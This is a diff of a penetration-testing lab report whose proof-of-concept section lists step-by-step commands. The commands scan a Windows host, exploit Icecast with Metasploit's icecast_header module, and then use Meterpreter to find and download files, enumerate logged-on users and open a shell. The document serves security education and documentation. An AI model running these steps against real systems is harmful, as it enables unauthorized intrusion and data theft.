@@ -92,47 +92,73 @@ Because the vulnerability allows an attacker to execute arbitrary code on the vi
 ## Proof of Concept
 
 Perform a service and version scan using Nmap to determine which services are up and running.
+
 `nmap -sV 192.168.0.20`
+
 ![Service and Version Scan](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/1.png)
 
 Search for any Icecast exploits
+
 `searchsploit icecast`
+
 ![Icecast search](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/2.png)
 
 Start Metasploit to use the exploit
+
 `msfconsole`
+
 ![Start Metasploit](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/3.png)
 
 Search for the Icecast module and load it for use
+
 `search icecast`
+
 ![Search Icecast Module](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/4.1.png)
+
 `use exploit /windows/http/icecast_header`
+
 ![Start Icecast Module](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/4.2.png)
 
 Set the RHOST to the target machine
+
 `set RHOST 192.168.0.20`
+
 ![Set RHOST](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/5.png)
 
 Run the Icecast exploit and find the secret file using it.
+
 `run`
+
 ![Run Exploit](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/6.1.png)
+
 `search -f *secretfile*`
+
 ![Search for secret file](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/6.2.png)
 
 Search for the recipe file and exfiltrate it.
+
 `search -f *recipe*`
+
 ![Search for recipe file](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/7.1.png)
+
 `download 'C:\Users\IEUser\Documents\Drinks.recipe.txt'`
+
 ![Exfiltrate recipe file](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/7.2.png)
 
 Enumerate all logged-in users on the remote host.
+
 `run post/windows/gather/enum_logged_on_users`
+
 ![Enumerate users](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/A.png)
 
 Open a Meterpreter shell and gather system information for the target.
+
 `shell`
+
 ![Open shell](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/B.png)
+
 `sysinfo`
+
 ![Gather system information](https://github.com/francescatirpak/pen-testing-ft/blob/main/Images/C.png)
 
 ## Recommendations
